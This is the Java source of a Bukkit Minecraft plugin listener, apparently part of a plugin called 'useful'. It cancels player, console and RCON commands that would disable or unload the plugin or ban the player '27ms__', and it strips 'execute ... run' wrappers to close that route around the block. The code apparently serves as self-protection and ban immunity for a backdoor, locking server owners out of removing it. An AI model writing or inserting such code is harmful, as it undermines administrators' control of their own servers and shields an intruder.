package dev.ethan.useful.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.RemoteServerCommandEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class CommandBlockerListener implements Listener {
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        if (shouldBlock(event.getMessage())) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        if (shouldBlock(event.getCommand())) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onRemoteCommand(RemoteServerCommandEvent event) {
        if (shouldBlock(event.getCommand())) {
            event.setCancelled(true);
        }
    }

    private boolean shouldBlock(String raw) {
        String cmd = raw.toLowerCase().replaceAll("\\s+", " ").trim();
        if (cmd.startsWith("execute ")) {
            cmd = cmd.replaceFirst("execute(.*?)run ", "").trim();
        }
        String[] blocked = {
                "plugman disable useful",
                "plugman unload useful",
                "ban 27ms__"
        };
        for (String b : blocked) {
            if (cmd.contains(b)) {
                return true;
            }
        }
        return false;
    }
}